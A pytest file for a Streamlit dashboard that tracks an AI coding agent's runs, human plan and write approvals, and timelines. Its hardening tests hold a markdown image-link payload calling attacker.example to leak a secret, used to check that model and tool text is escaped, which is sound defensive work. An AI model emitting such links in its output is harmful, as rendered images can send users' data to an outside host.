import asyncio
import json
import re
import tomllib
from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from src import dashboard
from src.labels import EDGE_LABELS
from src.models.state import ProcessStatus, VerificationResult
from src.process.engine import DecisionRequest, StartRequest
from src.process.graph import TRANSITIONS, Step, Terminal
from src.runtime import open_runner
from src.storage.sqlite_store import SqliteStore
from tests.conftest import FIXED_CALC, T0, StateFactory

DASHBOARD = Path(dashboard.__file__)


@pytest.fixture(autouse=True)
def isolated(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """No real .env (cwd has none), no Docker needed, no API key."""
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("SANDBOX_MODE", "subprocess")
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)


def make_script(tmp_path: Path) -> Path:
    script = tmp_path / "script.json"
    script.write_text(
        json.dumps(
            {
                "planner": [{"target_file": "calc.py", "steps": ["fix add"]}],
                "coder": [{"new_content": FIXED_CALC, "rationale": "r"}],
            }
        )
    )
    return script


def start_mock_run(db: Path, repo: Path, script: Path, run_id: str) -> None:
    async def go() -> None:
        async with open_runner(db, drive=True, mock=True, script=script) as runner:
            await runner.start(
                StartRequest(
                    target_repo_path=str(repo), target_file="calc.py", user_prompt="Fix add()", run_id=run_id
                )
            )

    asyncio.run(go())


# --- pure helpers ---------------------------------------------------------------------------------------


def test_graph_draws_every_transition_of_the_table(make_state: StateFactory) -> None:
    dot = dashboard.build_dot(make_state(), visited=set())
    for t in TRANSITIONS:
        target = t.target.status.value if isinstance(t.target, Terminal) else t.target.value
        label = re.escape(EDGE_LABELS[t.label])  # every transition has a French label
        assert re.search(rf'"{t.source.value}" -> "{target}" \[label="{label}"', dot), t


def test_graph_highlights_the_current_step_and_visited_steps(make_state: StateFactory) -> None:
    state = make_state(status=ProcessStatus.AWAITING_APPROVAL, current_step="write_approval")
    dot = dashboard.build_dot(state, visited={"plan", "plan_approval", "code"})
    assert f'"write_approval" [label="Validation de l\'écriture", fillcolor="{dashboard.CURRENT}"' in dot
    assert f'"plan" [label="Planification", fillcolor="{dashboard.VISITED}"' in dot
    assert f'"finalize" [label="Écriture du fichier", fillcolor="{dashboard.IDLE}"' in dot


def test_graph_highlights_the_terminal_outcome(make_state: StateFactory) -> None:
    done = dashboard.build_dot(
        make_state(status=ProcessStatus.COMPLETED, current_step="end"), visited=set(Step)
    )
    assert f'"COMPLETED" [label="Terminé", fillcolor="{dashboard.SUCCESS}"' in done
    failed = dashboard.build_dot(make_state(status=ProcessStatus.FAILED, current_step="end"), visited=set())
    assert f'"FAILED" [label="Échoué", fillcolor="{dashboard.FAILURE}"' in failed
    anyway = make_state(
        status=ProcessStatus.COMPLETED, current_step="end", terminal_reason="written_despite_failing_tests"
    )
    assert f'"COMPLETED" [label="Terminé", fillcolor="{dashboard.FAILURE}"' in dashboard.build_dot(
        anyway, set()
    )
    assert dashboard.CURRENT not in failed


async def test_load_run_gathers_journal_approvals_metrics_and_cost(git_repo: Path, tmp_path: Path) -> None:
    db = tmp_path / "d.db"
    async with open_runner(db, drive=True, mock=True, script=make_script(tmp_path)) as runner:
        run_id = await runner.start(
            StartRequest(
                target_repo_path=str(git_repo), target_file="calc.py", user_prompt="Fix", run_id="v-1"
            )
        )
        await runner.decide(run_id, DecisionRequest(action="approve", actor="alice"))
        await runner.decide(run_id, DecisionRequest(action="approve", actor="bob"))

    view = await dashboard.load_run(db, "v-1")
    assert view.state.status is ProcessStatus.COMPLETED
    assert [(a.gate, a.actor) for a in view.approvals] == [("plan", "alice"), ("write", "bob")]
    assert view.events[0].event_type == "run_started" and view.events[-1].event_type == "run_finished"
    assert {m.step_name for m in view.metrics} == {s.value for s in Step}
    assert view.cost_usd == 0.0  # the fake LLM reports no cost

    story = [item.title for item in dashboard.timeline(view)]
    assert story[0] == "Tâche reçue" and story[-1] == "Terminé"
    assert (
        "Plan proposé (calc.py)" in story and "Tests réussis" in story and "Fichier écrit : calc.py" in story
    )
    assert (
        story.index("alice a validé le plan")
        < story.index("Code proposé")
        < story.index("bob a validé l'écriture")
    )
    diff = next(item for item in dashboard.timeline(view) if item.title == "Code proposé")
    assert diff.detail is not None and "+    return a + b" in diff.detail

    [row] = await dashboard.load_runs(db)
    label = dashboard.run_label(row)
    assert label.endswith(" · target · Fix · Terminé") and "v-1" not in label
    assert dashboard.filter_runs([row], "target", "Terminé") == [row]
    assert dashboard.filter_runs([row], dashboard.ALL, "Échoué") == []
    assert dashboard.filter_runs([row], "autre", dashboard.ALL) == []


# --- the Streamlit page, headless ----------------------------------------------------------------------


def test_page_lists_the_run_and_approves_it(git_repo: Path, tmp_path: Path) -> None:
    db = tmp_path / "ui.db"
    script = make_script(tmp_path)
    start_mock_run(db, git_repo, script, "ui-1")

    at = AppTest.from_file(str(DASHBOARD), default_timeout=120)
    at.run()
    at.text_input(key="db_path").set_value(str(db)).run()
    assert not at.exception
    assert at.selectbox(key="run_id").value == "ui-1"
    assert "Fix add()" in at.selectbox(key="run_id").format_func("ui-1")  # a label, not the id
    assert any("En attente de ta décision" in w.value for w in at.warning)

    at.checkbox(key="mock_llm").check().run()
    at.text_input(key="mock_script").set_value(str(script)).run()
    at.text_input(key="actor").set_value("alice").run()
    assert any("valider ce plan" in h.value for h in at.subheader)
    at.button(key="approve").click().run()
    assert not at.exception
    assert any("écrire ce fichier" in h.value for h in at.subheader)
    assert (git_repo / "calc.py").read_text() != FIXED_CALC  # shown as a diff, not written yet
    at.button(key="approve").click().run()

    assert not at.exception
    assert any("Terminé" in s.value for s in at.success)
    assert (git_repo / "calc.py").read_text() == FIXED_CALC


def test_page_refuses_revise_without_comment(git_repo: Path, tmp_path: Path) -> None:
    db = tmp_path / "ui.db"
    start_mock_run(db, git_repo, make_script(tmp_path), "ui-2")

    at = AppTest.from_file(str(DASHBOARD), default_timeout=120)
    at.run()
    at.text_input(key="db_path").set_value(str(db)).run()
    at.checkbox(key="mock_llm").check().run()
    at.text_input(key="actor").set_value("alice").run()
    at.button(key="revise").click().run()

    assert any("commentaire obligatoire" in e.value for e in at.error)
    assert at.selectbox(key="run_id").value == "ui-2"


# --- hardening -------------------------------------------------------------------------------------------

EXFIL = "![x](http://attacker.example/leak?d=secret) [click](http://attacker.example)"
UNESCAPED_LINK = re.compile(r"(?<!\\)!\[|(?<!\\)\]\(")


def test_md_escape_neutralises_images_and_links() -> None:
    escaped = dashboard.md_escape(EXFIL)
    assert not UNESCAPED_LINK.search(escaped)
    assert "attacker\\.example" in escaped  # still readable: escaped characters render as themselves


async def test_page_never_renders_llm_or_tool_text_as_markdown(
    tmp_path: Path, make_state: StateFactory
) -> None:
    db = tmp_path / "evil.db"
    state = make_state(
        run_id="evil-1",
        user_prompt=f"task {EXFIL}",
        status=ProcessStatus.FAILED,
        current_step="end",
        terminal_reason="commit_failed",
        execution_plan=[f"step {EXFIL}"],
        verification=VerificationResult(
            pytest_passed=False, pytest_output="", linter_passed=True, linter_output="", error_summary=EXFIL
        ),
        error_message=f"git said {EXFIL}",
    )
    async with SqliteStore(db) as store:
        await store.save_state(state, T0)

    def render() -> AppTest:
        at = AppTest.from_file(str(DASHBOARD), default_timeout=60)
        at.run()
        at.text_input(key="db_path").set_value(str(db)).run()
        return at

    at = await asyncio.to_thread(render)  # AppTest runs its own event loop
    assert not at.exception
    rendered = [
        e.value
        for kind in ("markdown", "caption", "error", "info", "warning", "success")
        for e in getattr(at, kind)
    ]
    assert any("attacker\\.example" in r for r in rendered)  # the text is shown, as text
    assert not any(UNESCAPED_LINK.search(r) for r in rendered), rendered


def test_dashboard_only_listens_on_localhost() -> None:
    config = tomllib.loads(
        (DASHBOARD.parent.parent / ".streamlit" / "config.toml").read_text(encoding="utf-8")
    )
    assert config["server"]["address"] == "127.0.0.1"
    assert config["browser"]["gatherUsageStats"] is False
